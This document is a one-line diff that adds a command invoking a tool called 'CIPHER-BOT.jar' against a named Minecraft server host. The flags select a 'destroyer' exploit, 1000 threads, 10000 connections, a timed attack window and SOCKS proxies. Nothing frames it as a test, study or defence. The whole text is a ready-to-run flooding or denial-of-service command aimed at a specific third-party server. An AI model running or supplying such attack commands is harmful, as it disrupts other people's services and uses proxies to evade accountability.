@@ -1,0 +1,1 @@
+java -jar CIPHER-BOT.jar host=lenni0451.net port=25565 protocol=47 exploit=destroyer proxiesFile=proxies.txt srvResolve=false srvResolve2=false threads=1000 timeout=1000 attackTime=60 connections=10000 loopAmount=1 keepAlive=true alwaysResolve=false print=false multi=true removeFailure=false proxiesType=socks socksV4=true
